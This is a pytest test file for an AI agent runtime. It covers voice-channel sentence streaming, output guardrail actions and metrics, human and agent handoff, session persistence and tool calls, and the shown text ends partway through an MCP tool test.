from __future__ import annotations

from collections.abc import AsyncIterator
from dataclasses import dataclass, field
from unittest.mock import AsyncMock, Mock, patch

import pytest



from agent_runtime import (
    AgentAction,
    AgentMessage,
    AgentRole,
    AgentTurnRequest,
    AgentTurnResult,
    AgentTurnStreamEvent,
    ToolBinding,
    ToolRegistry,
)
from agent_runtime.config import AgentSettings, GuardrailsSettings, MemorySettings
from agent_runtime.contracts import HandoffDecision, KnowledgeChunk
from agent_runtime.memory import ContextManager, ContextWindowConfig, InMemorySessionStore, MessagePriority, mark_message_priority
from agent_runtime.definition.loader import StaticAgentDefinitionLoader
from agent_runtime.definition.models import AgentDefinitionSnapshot, KnowledgeBindingSnapshot, McpBindingSnapshot, ToolBindingSnapshot
from agent_runtime.tools.builtin.knowledge_search import KnowledgeSearchTool
from agent_runtime.tools.contracts import ToolExecutionContext, ToolResult, ToolSpec
from agent_runtime.errors import AgentError
from agent_runtime.mcp.client import McpClientManager
from agent_runtime.orchestration import DelegateToAgentTool, HandoffManager, SubAgentExecutor
from agent_runtime.contracts.models import HandoffTarget
from agent_runtime.guardrails import (
    GuardContext,
    GuardResult,
    GuardVerdict,
    GlobalGuardrailMatcher,
    GlobalGuardrailRule,
    GlobalGuardrailsSnapshot,
    GuardsPipeline,
    StaticGlobalGuardrailsRepository,
)
from agent_runtime.guardrails.factory import build_guards_pipeline
from agent_runtime.runtime import AgentRunDeps, AgentRuntime
from llm_gateway import ProviderId, TextGenerateResponse, TextStreamEvent, UsageInfo


class FakeGatewayService:
    def __init__(self, responses):
        self.responses = list(responses)
        self.requests = []
        self.stream_requests = []

    async def generate_text(self, request):
        self.requests.append(request)
        response = self.responses.pop(0)
        if isinstance(response, Exception):
            raise response
        return response

    async def generate_text_stream(self, request) -> AsyncIterator[TextStreamEvent]:
        self.stream_requests.append(request)
        response = self.responses.pop(0)
        if isinstance(response, Exception):
            raise response
        for event in response:
            yield event

from agent_runtime.channels.voice import split_flushable_voice_segments as _split_flushable_voice_segments


@dataclass(slots=True)
class _StaticGuard:
    name: str
    phase: str
    result: GuardResult

    async def evaluate(self, context: GuardContext) -> GuardResult:
        return self.result


@dataclass(slots=True)
class _CountingSafeReplyGenerator:
    reply_text: str
    raise_error: bool = False
    calls: list[tuple[GuardContext, GuardResult]] = field(default_factory=list)

    async def __call__(self, context: GuardContext, result: GuardResult) -> str:
        self.calls.append((context, result))
        if self.raise_error:
            raise RuntimeError("safe reply generation failed")
        return self.reply_text


def _global_rule(
    *,
    rule_key: str,
    priority: int,
    action: str,
    scope: str = "output",
    hints: tuple[str, ...] = ("credit card",),
    reason: str = "guardrail_match",
) -> GlobalGuardrailRule:
    return GlobalGuardrailRule(
        rule_key=rule_key,
        title=rule_key,
        description=f"{rule_key} description",
        enabled=True,
        priority=priority,
        matcher=GlobalGuardrailMatcher(
            type="llm_judge",
            rubric=f"Match {rule_key}",
            scope=scope,
            threshold=0.7,
            hints=hints,
        ),
        action=action,
        action_config={"reason": reason},
        failure_mode="fail_closed",
    )


@pytest.mark.asyncio
async def test_stream_turn_multi_sentence_in_one_delta():
    from agent_runtime.definition.models import VoiceGuardrailsSnapshot

    gateway = FakeGatewayService(
        [
            [
                TextStreamEvent(
                    event_type="delta",
                    provider=ProviderId.OPENAI,
                    model="agent.sales",
                    delta='{"kind":"final","reply_text":"First sentence. Second sentence.',
                ),
                TextStreamEvent(
                    event_type="completed",
                    provider=ProviderId.OPENAI,
                    model="agent.sales",
                    text='{"kind":"final","reply_text":"First sentence. Second sentence.","should_handoff":false}',
                    usage=UsageInfo(input_tokens=1, output_tokens=1, total_tokens=2),
                ),
            ]
        ]
    )

    snapshot = _sample_definition(
        guardrails_policy={"voice_guardrails": {}},
        voice_guardrails=VoiceGuardrailsSnapshot(),
    )
    runtime = AgentRuntime(
        settings=AgentSettings(),
        gateway=gateway,
        tool_registry=ToolRegistry(),
        definition_loader=StaticAgentDefinitionLoader({"sales-assistant": snapshot}),
    )

    deltas = []
    async for event in runtime.stream_turn(
        AgentTurnRequest(
            session_id="s1",
            user_message="test",
            history=[AgentMessage(role=AgentRole.USER, content="hi")],
            channel="voice",
            agent_key="sales-assistant",
        )
    ):
        if event.event_type == "reply_delta":
            deltas.append(event.delta)

    assert deltas == ["First sentence.", "Second sentence."]


@pytest.mark.asyncio
async def test_stream_turn_multi_sentence_no_space_between_sentences():
    """Regression: Sentences with no space between should split correctly (English and Chinese)."""
    from agent_runtime.definition.models import VoiceGuardrailsSnapshot
    gateway = FakeGatewayService(
        [
            [
                TextStreamEvent(
                    event_type="delta",
                    provider=ProviderId.OPENAI,
                    model="agent.sales",
                    delta='{"kind":"final","reply_text":"First sentence.Second sentence.",',
                ),
                TextStreamEvent(
                    event_type="completed",
                    provider=ProviderId.OPENAI,
                    model="agent.sales",
                    text='{"kind":"final","reply_text":"First sentence.Second sentence.","should_handoff":false}',
                    usage=UsageInfo(input_tokens=1, output_tokens=1, total_tokens=2),
                ),
            ]
        ]
    )
    snapshot = _sample_definition(
        guardrails_policy={"voice_guardrails": {}},
        voice_guardrails=VoiceGuardrailsSnapshot(),
    )
    runtime = AgentRuntime(
        settings=AgentSettings(),
        gateway=gateway,
        tool_registry=ToolRegistry(),
        definition_loader=StaticAgentDefinitionLoader({"sales-assistant": snapshot}),
    )
    deltas = []
    async for event in runtime.stream_turn(
        AgentTurnRequest(
            session_id="s1",
            user_message="test",
            history=[AgentMessage(role=AgentRole.USER, content="hi")],
            channel="voice",
            agent_key="sales-assistant",
        )
    ):
        if event.event_type == "reply_delta":
            deltas.append(event.delta)
    assert deltas == ["First sentence.", "Second sentence."]

    # Chinese case
    gateway = FakeGatewayService(
        [
            [
                TextStreamEvent(
                    event_type="delta",
                    provider=ProviderId.OPENAI,
                    model="agent.sales",
                    delta='{"kind":"final","reply_text":"第一句。第二句。",',
                ),
                TextStreamEvent(
                    event_type="completed",
                    provider=ProviderId.OPENAI,
                    model="agent.sales",
                    text='{"kind":"final","reply_text":"第一句。第二句。","should_handoff":false}',
                    usage=UsageInfo(input_tokens=1, output_tokens=1, total_tokens=2),
                ),
            ]
        ]
    )
    runtime = AgentRuntime(
        settings=AgentSettings(),
        gateway=gateway,
        tool_registry=ToolRegistry(),
        definition_loader=StaticAgentDefinitionLoader({"sales-assistant": snapshot}),
    )
    deltas = []
    async for event in runtime.stream_turn(
        AgentTurnRequest(
            session_id="s1",
            user_message="test",
            history=[AgentMessage(role=AgentRole.USER, content="hi")],
            channel="voice",
            agent_key="sales-assistant",
        )
    ):
        if event.event_type == "reply_delta":
            deltas.append(event.delta)
    assert deltas == ["第一句。", "第二句。"]


class StubKnowledgeProvider:
    def search(self, query: str, top_k: int = 5):
        return [
            KnowledgeChunk(
                title="Shipping policy",
                content="Orders ship within 24 hours after payment confirmation.",
                source="kb://shipping",
            )
        ]


class StubWeatherTool:
    def __init__(self) -> None:
        self.calls = []

    async def execute(self, arguments, context: ToolExecutionContext):
        self.calls.append((dict(arguments), context))
        city = arguments.get("city") or arguments.get("query") or "unknown"
        return ToolResult(output=f"{city} tomorrow: light rain, 22 to 28 C.")


class StubHandoffPolicy:
    def evaluate(self, reason: str, context):
        return HandoffDecision(
            should_handoff=True,
            reason=f"policy:{reason}",
        )


class StubAgentHandoffRunner:
    def __init__(self, result):
        self.calls = []
        self._result = result

    async def run_turn(self, request):
        self.calls.append(request)
        return self._result


class StubStreamingRunner:
    def __init__(
        self,
        *,
        run_result: AgentTurnResult | None = None,
        stream_events: list[AgentTurnStreamEvent] | None = None,
    ):
        self.run_calls = []
        self.stream_calls = []
        self._run_result = run_result or AgentTurnResult(
            session_id="session-sub",
            trace_id="trace-sub",
            action=AgentAction.REPLY,
            reply_text="sub reply",
            usage=UsageInfo(input_tokens=2, output_tokens=1, total_tokens=3),
        )
        self._stream_events = stream_events or []

    async def run_turn(self, request):
        self.run_calls.append(request)
        return self._run_result

    async def stream_turn(self, request):
        self.stream_calls.append(request)
        for event in self._stream_events:
            yield event


class CharacterTokenCounter:
    def count(self, text: str) -> int:
        return len(text)

    def count_messages(self, messages: list[AgentMessage]) -> int:
        total = 0
        for message in messages:
            total += 4 + len(message.content)
            if message.name:
                total += len(message.name)
        return total


def _make_fake_mcp_raw_tool(name: str, description: str = "Remote tool") -> Mock:
    raw = Mock()
    raw.name = name
    raw.description = description
    raw.parameters_json_schema = {"type": "object", "properties": {"path": {"type": "string"}}}
    return raw


def _make_fake_mcp_client(*, tools: list[object], call_result: str = "ok") -> AsyncMock:
    client = AsyncMock()
    client.__aenter__ = AsyncMock(return_value=client)
    client.__aexit__ = AsyncMock(return_value=None)
    client.list_tools = AsyncMock(return_value=tools)
    client.direct_call_tool = None
    client.call_tool = AsyncMock(return_value=call_result)
    return client


def _sample_definition(
    *,
    tool_mode: str = "auto",
    runtime_options: dict | None = None,
    guardrails_policy: dict | None = None,
    voice_guardrails=None,
) -> AgentDefinitionSnapshot:
    return AgentDefinitionSnapshot(
        agent_key="sales-assistant",
        version_number=3,
        display_name="Sales Assistant",
        system_prompt_template="You are the sales definition prompt.",
        model_binding_key="agent.sales",
        tools=(
            ToolBindingSnapshot(
                tool_name="knowledge_search",
                invocation_mode=tool_mode,
            ),
        ),
        runtime_options=runtime_options or {},
        guardrails_policy=guardrails_policy or {},
        voice_guardrails=voice_guardrails,
        checksum="sha256:test",
    )


@pytest.mark.asyncio
class TestAgentRuntime:
    async def test_run_turn_returns_structured_reply_and_transparent_gateway_request(self):
        gateway = FakeGatewayService(
            [
                TextGenerateResponse(
                    provider=ProviderId.OPENAI,
                    model="gpt-4.1-mini",
                    text='{"kind":"final","reply_text":"Your order will ship tomorrow.","should_handoff":false}',
                    usage=UsageInfo(input_tokens=10, output_tokens=6, total_tokens=16),
                )
            ]
        )
        runtime = AgentRuntime(
            settings=AgentSettings(),
            gateway=gateway,
            tool_registry=ToolRegistry(),
        )

        result = await runtime.run_turn(
            AgentTurnRequest(
                session_id="session-1",
                user_message="When will my order ship?",
                history=[
                    AgentMessage(role=AgentRole.USER, content="I placed an order yesterday."),
                    AgentMessage(role=AgentRole.ASSISTANT, content="I can help with that."),
                ],
                provider=ProviderId.OPENAI,
                trace_id="trace-123",
            )
        )

        assert result.action == AgentAction.REPLY
        assert result.reply_text == "Your order will ship tomorrow."
        assert result.trace_id == "trace-123"
        assert result.usage.total_tokens == 16
        assert gateway.requests[0].model == "gpt-4.1-mini"
        assert gateway.requests[0].provider == ProviderId.OPENAI
        assert gateway.requests[0].trace_id == "trace-123"
        assert "When will my order ship?" in gateway.requests[0].prompt

    @pytest.mark.asyncio
    async def test_run_turn_voice_guardrails_fallback_and_transfer_human(self):
        """
        run_turn applies voice guardrails for fallback_reply and transfer_human actions.
        """
        from agent_runtime.definition.models import VoiceGuardrailsSnapshot
        # fallback_reply case
        generator = _CountingSafeReplyGenerator("SAFE VOICE REPLY")
        runtime = AgentRuntime(
            settings=AgentSettings(),
            gateway=FakeGatewayService([
                TextGenerateResponse(
                    provider=ProviderId.OPENAI,
                    model="gpt-4.1-mini",
                    text='{"kind":"final","reply_text":"Sensitive info.","should_handoff":false}',
                )
            ]),
            tool_registry=ToolRegistry(),
            definition_loader=StaticAgentDefinitionLoader({
                "sales-assistant": _sample_definition(
                    guardrails_policy={"voice_guardrails": {"mode": "enforced", "revision": 1}},
                    voice_guardrails=VoiceGuardrailsSnapshot(
                        mode="enforced", revision=1, actions=("fallback_reply",)
                    ),
                )
            }),
            guards_pipeline=GuardsPipeline(
                output_guards=[
                    _StaticGuard(
                        name="voice_output_judge",
                        phase="output",
                        result=GuardResult(
                            verdict=GuardVerdict.BLOCK,
                            guard_name="voice_output_judge",
                            reason="voice_segment_blocked",
                            details={"suggested_action": "fallback_reply"},
                        ),
                    )
                ],
                safe_reply_generator=generator,
            ),
        )
        result = await runtime.run_turn(
            AgentTurnRequest(
                session_id="voice-fallback-rt-1",
                user_message="Sensitive info.",
                channel="voice",
                agent_key="sales-assistant",
            )
        )
        assert result.reply_text == "SAFE VOICE REPLY"
        assert result.action == AgentAction.REPLY
        assert len(generator.calls) == 1
        assert result.raw_messages[-1].content == "SAFE VOICE REPLY"

        # transfer_human case
        runtime = AgentRuntime(
            settings=AgentSettings(default_handoff_message="[HANDOFF] Please wait for a human agent."),
            gateway=FakeGatewayService([
                TextGenerateResponse(
                    provider=ProviderId.OPENAI,
                    model="gpt-4.1-mini",
                    text='{"kind":"final","reply_text":"Sensitive info.","should_handoff":false}',
                )
            ]),
            tool_registry=ToolRegistry(),
            definition_loader=StaticAgentDefinitionLoader({
                "sales-assistant": _sample_definition(
                    guardrails_policy={"voice_guardrails": {"mode": "enforced", "revision": 2}},
                    voice_guardrails=VoiceGuardrailsSnapshot(
                        mode="enforced", revision=2, actions=("transfer_human",)
                    ),
                )
            }),
            guards_pipeline=GuardsPipeline(
                output_guards=[
                    _StaticGuard(
                        name="voice_output_judge",
                        phase="output",
                        result=GuardResult(
                            verdict=GuardVerdict.BLOCK,
                            guard_name="voice_output_judge",
                            reason="voice_segment_blocked",
                            details={"suggested_action": "transfer_human"},
                        ),
                    )
                ]
            ),
        )
        result = await runtime.run_turn(
            AgentTurnRequest(
                session_id="voice-transfer-rt-1",
                user_message="Sensitive info.",
                channel="voice",
                agent_key="sales-assistant",
            )
        )
        assert result.action == AgentAction.HANDOFF_HUMAN
        assert result.reply_text == "[HANDOFF] Please wait for a human agent."
        assert result.handoff_reason == "voice_segment_blocked"
        assert result.handoff_target is not None
        assert result.handoff_target.target_type == "human"
        assert result.raw_messages[-1].content == "[HANDOFF] Please wait for a human agent."

    @pytest.mark.asyncio
    async def test_run_turn_voice_transfer_human_takes_precedence_over_model_agent_handoff(self):
        from agent_runtime.definition.models import VoiceGuardrailsSnapshot

        sub_result = AgentTurnResult(
            session_id="session-sub-runturn-1",
            trace_id="trace-sub-runturn-1",
            action=AgentAction.REPLY,
            reply_text="Agent handoff should not execute",
            agent_key="other-agent",
            raw_messages=[AgentMessage(role=AgentRole.ASSISTANT, content="Agent handoff should not execute")],
        )
        runner = StubAgentHandoffRunner(sub_result)

        runtime = AgentRuntime(
            settings=AgentSettings(default_handoff_message="[HANDOFF] Please wait for a human agent."),
            gateway=FakeGatewayService([
                TextGenerateResponse(
                    provider=ProviderId.OPENAI,
                    model="gpt-4.1-mini",
                    text='{"kind":"final","reply_text":"Sensitive info.","should_handoff":true,"handoff_target_type":"agent","handoff_target_agent":"other-agent"}',
                )
            ]),
            tool_registry=ToolRegistry(),
            definition_loader=StaticAgentDefinitionLoader({
                "sales-assistant": _sample_definition(
                    guardrails_policy={"voice_guardrails": {"mode": "enforced", "revision": 4}},
                    voice_guardrails=VoiceGuardrailsSnapshot(
                        mode="enforced", revision=4, actions=("transfer_human",)
                    ),
                )
            }),
            guards_pipeline=GuardsPipeline(
                output_guards=[
                    _StaticGuard(
                        name="voice_output_judge",
                        phase="output",
                        result=GuardResult(
                            verdict=GuardVerdict.BLOCK,
                            guard_name="voice_output_judge",
                            reason="voice_segment_blocked",
                            details={"suggested_action": "transfer_human"},
                        ),
                    )
                ]
            ),
            handoff_manager=HandoffManager(runner),
        )

        result = await runtime.run_turn(
            AgentTurnRequest(
                session_id="voice-transfer-runturn-precedence-1",
                user_message="Sensitive info.",
                channel="voice",
                agent_key="sales-assistant",
            )
        )

        assert result.action == AgentAction.HANDOFF_HUMAN
        assert result.reply_text == "[HANDOFF] Please wait for a human agent."
        assert result.handoff_reason == "voice_segment_blocked"
        assert result.handoff_target is not None
        assert result.handoff_target.target_type == "human"
        assert runner.calls == []

    @pytest.mark.asyncio
    async def test_run_turn_voice_interrupt_only_with_model_handoff_sets_human_handoff_metadata(self):
        from agent_runtime.definition.models import VoiceGuardrailsSnapshot

        runtime = AgentRuntime(
            settings=AgentSettings(default_handoff_message="[HANDOFF] Please wait for a human agent."),
            gateway=FakeGatewayService([
                TextGenerateResponse(
                    provider=ProviderId.OPENAI,
                    model="gpt-4.1-mini",
                    text='{"kind":"final","reply_text":"Sensitive info.","should_handoff":true,"handoff_reason":"voice escalation"}',
                )
            ]),
            tool_registry=ToolRegistry(handoff_policy=StubHandoffPolicy()),
            definition_loader=StaticAgentDefinitionLoader({
                "sales-assistant": _sample_definition(
                    guardrails_policy={"voice_guardrails": {"mode": "enforced", "revision": 5}},
                    voice_guardrails=VoiceGuardrailsSnapshot(
                        mode="enforced", revision=5, actions=("interrupt_only",)
                    ),
                )
            }),
            guards_pipeline=GuardsPipeline(
                output_guards=[
                    _StaticGuard(
                        name="voice_output_judge",
                        phase="output",
                        result=GuardResult(
                            verdict=GuardVerdict.BLOCK,
                            guard_name="voice_output_judge",
                            reason="voice_segment_blocked",
                            details={"suggested_action": "interrupt_only"},
                        ),
                    )
                ]
            ),
        )

        result = await runtime.run_turn(
            AgentTurnRequest(
                session_id="voice-interrupt-runturn-handoff-1",
                user_message="Sensitive info.",
                channel="voice",
                agent_key="sales-assistant",
            )
        )

        assert result.action == AgentAction.HANDOFF
        assert result.reply_text == "[HANDOFF] Please wait for a human agent."
        assert result.handoff_reason == "policy:voice escalation"
        assert result.handoff_target is not None
        assert result.handoff_target.target_type == "human"
        assert result.raw_messages[-1].content == "[HANDOFF] Please wait for a human agent."

    @pytest.mark.asyncio
    async def test_run_turn_voice_guardrails_latency_budget(self):
        """
        run_turn enforces max_added_latency_ms for fallback_reply.
        """
        from agent_runtime.definition.models import VoiceGuardrailsSnapshot
        import asyncio
        class SlowSafeReply(_CountingSafeReplyGenerator):
            async def __call__(self, context, result):
                await asyncio.sleep(0.05)  # 50ms
                return await super().__call__(context, result)
        # Budget is 10ms, generator takes 50ms, should fail open (emit original)
        generator = SlowSafeReply("SAFE VOICE REPLY")
        runtime = AgentRuntime(
            settings=AgentSettings(),
            gateway=FakeGatewayService([
                TextGenerateResponse(
                    provider=ProviderId.OPENAI,
                    model="gpt-4.1-mini",
                    text='{"kind":"final","reply_text":"Sensitive info.","should_handoff":false}',
                )
            ]),
            tool_registry=ToolRegistry(),
            definition_loader=StaticAgentDefinitionLoader({
                "sales-assistant": _sample_definition(
                    guardrails_policy={"voice_guardrails": {"mode": "enforced", "revision": 3, "max_added_latency_ms": 10}},
                    voice_guardrails=VoiceGuardrailsSnapshot(
                        mode="enforced", revision=3, actions=("fallback_reply",), max_added_latency_ms=10
                    ),
                )
            }),
            guards_pipeline=GuardsPipeline(
                output_guards=[
                    _StaticGuard(
                        name="voice_output_judge",
                        phase="output",
                        result=GuardResult(
                            verdict=GuardVerdict.BLOCK,
                            guard_name="voice_output_judge",
                            reason="voice_segment_blocked",
                            details={"suggested_action": "fallback_reply"},
                        ),
                    )
                ],
                safe_reply_generator=generator,
            ),
        )
        result = await runtime.run_turn(
            AgentTurnRequest(
                session_id="voice-latency-budget-rt-1",
                user_message="Sensitive info.",
                channel="voice",
                agent_key="sales-assistant",
            )
        )
        # Should fail open: emit original text, not safe reply
        assert result.reply_text == "Sensitive info."
        assert result.action == AgentAction.REPLY
        assert len(generator.calls) == 0

    @pytest.mark.asyncio
    async def test_run_turn_voice_observe_only_does_not_emit_modified_text(self):
        from agent_runtime.definition.models import VoiceGuardrailsSnapshot

        runtime = AgentRuntime(
            settings=AgentSettings(),
            gateway=FakeGatewayService([
                TextGenerateResponse(
                    provider=ProviderId.OPENAI,
                    model="gpt-4.1-mini",
                    text='{"kind":"final","reply_text":"Sensitive info.","should_handoff":false}',
                )
            ]),
            tool_registry=ToolRegistry(),
            definition_loader=StaticAgentDefinitionLoader({
                "sales-assistant": _sample_definition(
                    guardrails_policy={"voice_guardrails": {"mode": "observe_only", "revision": 4}},
                    voice_guardrails=VoiceGuardrailsSnapshot(
                        mode="observe_only", revision=4, actions=("fallback_reply",)
                    ),
                )
            }),
            guards_pipeline=GuardsPipeline(
                output_guards=[
                    _StaticGuard(
                        name="voice_output_judge",
                        phase="output",
                        result=GuardResult(
                            verdict=GuardVerdict.PASS,
                            guard_name="voice_output_judge",
                            reason="voice_segment_modified",
                            modified_text="REDACTED",
                        ),
                    )
                ]
            ),
        )

        result = await runtime.run_turn(
            AgentTurnRequest(
                session_id="voice-observe-modify-rt-1",
                user_message="Sensitive info.",
                channel="voice",
                agent_key="sales-assistant",
            )
        )

        assert result.reply_text == "Sensitive info."
        assert result.action == AgentAction.REPLY
        assert result.raw_messages[-1].content == "Sensitive info."

    @pytest.mark.asyncio
    async def test_run_turn_voice_observe_only_pass_does_not_increment_modify_metrics(self):
        from agent_runtime.definition.models import VoiceGuardrailsSnapshot

        runtime = AgentRuntime(
            settings=AgentSettings(),
            gateway=FakeGatewayService([
                TextGenerateResponse(
                    provider=ProviderId.OPENAI,
                    model="gpt-4.1-mini",
                    text='{"kind":"final","reply_text":"Sensitive info.","should_handoff":false}',
                )
            ]),
            tool_registry=ToolRegistry(),
            definition_loader=StaticAgentDefinitionLoader({
                "sales-assistant": _sample_definition(
                    guardrails_policy={"voice_guardrails": {"mode": "observe_only", "revision": 10}},
                    voice_guardrails=VoiceGuardrailsSnapshot(
                        mode="observe_only", revision=10, actions=("fallback_reply",)
                    ),
                )
            }),
            guards_pipeline=GuardsPipeline(
                output_guards=[
                    _StaticGuard(
                        name="voice_output_judge",
                        phase="output",
                        result=GuardResult(
                            verdict=GuardVerdict.PASS,
                            guard_name="voice_output_judge",
                            reason="voice_segment_allowed",
                        ),
                    )
                ]
            ),
        )

        await runtime.run_turn(
            AgentTurnRequest(
                session_id="voice-observe-pass-rt-1",
                user_message="Sensitive info.",
                channel="voice",
                agent_key="sales-assistant",
            )
        )

        metrics = runtime.voice_guardrail_metrics()
        samples = runtime.recent_voice_guardrail_samples()

        assert metrics["modify_count"] == 0
        assert samples[0]["action"] == "allow"

    @pytest.mark.asyncio
    async def test_run_turn_agent_handoff_persists_session_snapshot(self):
        gateway = FakeGatewayService(
            [
                TextGenerateResponse(
                    provider=ProviderId.OPENAI,
                    model="gpt-4.1-mini",
                    text='{"kind":"final","reply_text":"Routing","should_handoff":true,"handoff_reason":"refund","handoff_target_type":"agent","handoff_target_agent":"refund-specialist"}',
                )
            ]
        )
        sub_result = AgentTurnResult(
            session_id="session-sub-persist-1",
            trace_id="trace-sub-persist-1",
            action=AgentAction.REPLY,
            reply_text="Refund specialist reply",
            agent_key="refund-specialist",
            raw_messages=[AgentMessage(role=AgentRole.ASSISTANT, content="Refund specialist reply")],
        )
        runner = StubAgentHandoffRunner(sub_result)
        session_store = InMemorySessionStore()
        settings = AgentSettings(
            memory=MemorySettings(
                enabled=True,
                persist_sessions=True,
                max_total_tokens=400,
                reserve_for_response=0,
                reserve_for_system=0,
                min_recent_messages=4,
                enable_summarization=False,
            )
        )
        runtime = AgentRuntime(
            settings=settings,
            gateway=gateway,
            tool_registry=ToolRegistry(),
            handoff_manager=HandoffManager(runner),
            context_manager=ContextManager(
                ContextWindowConfig(
                    max_total_tokens=400,
                    reserve_for_response=0,
                    reserve_for_system=0,
                    min_recent_messages=4,
                    enable_summarization=False,
                ),
                token_counter=CharacterTokenCounter(),
            ),
            session_store=session_store,
        )

        result = await runtime.run_turn(
            AgentTurnRequest(
                session_id="session-agent-handoff-persist-1",
                user_message="Need refund help",
                agent_key="triage",
                trace_id="trace-agent-handoff-persist-1",
            )
        )

        stored = await session_store.load("session-agent-handoff-persist-1")

        assert result.reply_text == "Refund specialist reply"
        assert stored is not None
        assert stored.messages[-1].content == "Refund specialist reply"

    @pytest.mark.asyncio
    async def test_run_turn_voice_guardrails_exposes_audit_samples_and_metrics(self):
        from agent_runtime.definition.models import VoiceGuardrailsSnapshot

        generator = _CountingSafeReplyGenerator("SAFE VOICE REPLY")
        runtime = AgentRuntime(
            settings=AgentSettings(),
            gateway=FakeGatewayService([
                TextGenerateResponse(
                    provider=ProviderId.OPENAI,
                    model="gpt-4.1-mini",
                    text='{"kind":"final","reply_text":"Sensitive info.","should_handoff":false}',
                )
            ]),
            tool_registry=ToolRegistry(),
            definition_loader=StaticAgentDefinitionLoader({
                "sales-assistant": _sample_definition(
                    guardrails_policy={"voice_guardrails": {"mode": "enforced", "revision": 7}},
                    voice_guardrails=VoiceGuardrailsSnapshot(
                        mode="enforced", revision=7, actions=("fallback_reply",)
                    ),
                )
            }),
            guards_pipeline=GuardsPipeline(
                output_guards=[
                    _StaticGuard(
                        name="voice_output_judge",
                        phase="output",
                        result=GuardResult(
                            verdict=GuardVerdict.BLOCK,
                            guard_name="voice_output_judge",
                            reason="voice_segment_blocked",
                            details={"suggested_action": "fallback_reply"},
                        ),
                    )
                ],
                safe_reply_generator=generator,
            ),
        )

        await runtime.run_turn(
            AgentTurnRequest(
                session_id="voice-audit-rt-1",
                user_message="Sensitive info.",
                channel="voice",
                agent_key="sales-assistant",
            )
        )

        metrics = runtime.voice_guardrail_metrics()
        samples = runtime.recent_voice_guardrail_samples()

        assert metrics["evaluated_count"] == 1
        assert metrics["hit_count"] == 1
        assert metrics["block_count"] == 1
        assert metrics["fallback_count"] == 1
        assert metrics["judge_failure_count"] == 0
        assert metrics["generator_failure_count"] == 0
        assert samples[0]["revision"] == 7
        assert samples[0]["action"] == "fallback_reply"
        assert samples[0]["reason"] == "voice_segment_blocked"
        assert samples[0]["visible_text"] == "SAFE VOICE REPLY"
        assert samples[0]["simulated"] is False

    @pytest.mark.asyncio
    async def test_run_turn_voice_guardrails_metrics_count_judge_and_generator_failures(self):
        from agent_runtime.definition.models import VoiceGuardrailsSnapshot

        class _ExplodingGuard:
            name = "voice_output_judge"
            phase = "output"

            async def evaluate(self, context):
                raise RuntimeError("judge exploded")

        class _ExplodingSafeReply:
            async def __call__(self, context, result):
                raise RuntimeError("generator exploded")

        judge_runtime = AgentRuntime(
            settings=AgentSettings(),
            gateway=FakeGatewayService([
                TextGenerateResponse(
                    provider=ProviderId.OPENAI,
                    model="gpt-4.1-mini",
                    text='{"kind":"final","reply_text":"Sensitive info.","should_handoff":false}',
                )
            ]),
            tool_registry=ToolRegistry(),
            definition_loader=StaticAgentDefinitionLoader({
                "sales-assistant": _sample_definition(
                    guardrails_policy={"voice_guardrails": {"mode": "enforced", "revision": 8}},
                    voice_guardrails=VoiceGuardrailsSnapshot(
                        mode="enforced", revision=8, actions=("fallback_reply",)
                    ),
                )
            }),
            guards_pipeline=GuardsPipeline(output_guards=[_ExplodingGuard()]),
        )

        await judge_runtime.run_turn(
            AgentTurnRequest(
                session_id="voice-audit-judge-failure-1",
                user_message="Sensitive info.",
                channel="voice",
                agent_key="sales-assistant",
            )
        )

        generator_runtime = AgentRuntime(
            settings=AgentSettings(),
            gateway=FakeGatewayService([
                TextGenerateResponse(
                    provider=ProviderId.OPENAI,
                    model="gpt-4.1-mini",
                    text='{"kind":"final","reply_text":"Sensitive info.","should_handoff":false}',
                )
            ]),
            tool_registry=ToolRegistry(),
            definition_loader=StaticAgentDefinitionLoader({
                "sales-assistant": _sample_definition(
                    guardrails_policy={"voice_guardrails": {"mode": "enforced", "revision": 9}},
                    voice_guardrails=VoiceGuardrailsSnapshot(
                        mode="enforced", revision=9, actions=("fallback_reply",)
                    ),
                )
            }),
            guards_pipeline=GuardsPipeline(
                output_guards=[
                    _StaticGuard(
                        name="voice_output_judge",
                        phase="output",
                        result=GuardResult(
                            verdict=GuardVerdict.BLOCK,
                            guard_name="voice_output_judge",
                            reason="voice_segment_blocked",
                            details={"suggested_action": "fallback_reply"},
                        ),
                    )
                ],
                safe_reply_generator=_ExplodingSafeReply(),
            ),
        )

        await generator_runtime.run_turn(
            AgentTurnRequest(
                session_id="voice-audit-generator-failure-1",
                user_message="Sensitive info.",
                channel="voice",
                agent_key="sales-assistant",
            )
        )

        judge_metrics = judge_runtime.voice_guardrail_metrics()
        generator_metrics = generator_runtime.voice_guardrail_metrics()

        assert judge_metrics["judge_failure_count"] == 1
        assert generator_metrics["generator_failure_count"] == 1


    async def test_run_turn_supports_tool_call_via_pydantic_ai_loop(self):
        gateway = FakeGatewayService(
            [
                TextGenerateResponse(
                    provider=ProviderId.OPENAI,
                    model="gpt-4.1-mini",
                    text='{"kind":"tool_call","tool_name":"knowledge_search","arguments":{"query":"shipping policy","top_k":1}}',
                    usage=UsageInfo(input_tokens=20, output_tokens=12, total_tokens=32),
                ),
                TextGenerateResponse(
                    provider=ProviderId.OPENAI,
                    model="gpt-4.1-mini",
                    text='{"kind":"final","reply_text":"Orders ship within 24 hours after payment confirmation.","should_handoff":false}',
                    usage=UsageInfo(input_tokens=15, output_tokens=9, total_tokens=24),
                ),
            ]
        )
        runtime = AgentRuntime(
            settings=AgentSettings(),
            gateway=gateway,
            tool_registry=ToolRegistry(knowledge_provider=StubKnowledgeProvider()),
        )

        result = await runtime.run_turn(
            AgentTurnRequest(
                session_id="session-2",
                user_message="What is your shipping policy?",
            )
        )

        assert result.action == AgentAction.REPLY
        assert result.reply_text == "Orders ship within 24 hours after payment confirmation."
        assert len(result.tool_events) == 1
        assert result.tool_events[0].tool_name == "knowledge_search"
        assert len(gateway.requests) == 2

    async def test_run_turn_exposes_and_executes_definition_aware_mcp_tool(self):
        gateway = FakeGatewayService(
            [
                TextGenerateResponse(
                    provider=ProviderId.OPENAI,
                    model="gpt-4.1-mini",
                    text='{"kind":"tool_call","tool_name":"fs_read_file","arguments":{"path":"/tmp/demo.txt"}}',
                    usage=UsageInfo(input_tokens=8, output_tokens=4, total_tokens=12),
                ),
                TextGenerateResponse(
                    provider=ProviderId.OPENAI,
                    model="gpt-4.1-mini",
                    text='{"kind":"final","reply_text":"Read complete.","should_handoff":false}',
                    usage=UsageInfo(input_tokens=6, output_tokens=3, total_tokens=9),
                ),
            ]
        )
        fake_client = _make_fake_mcp_client(
            tools=[
                _make_fake_mcp_raw_tool("read_file", "Read a file"),
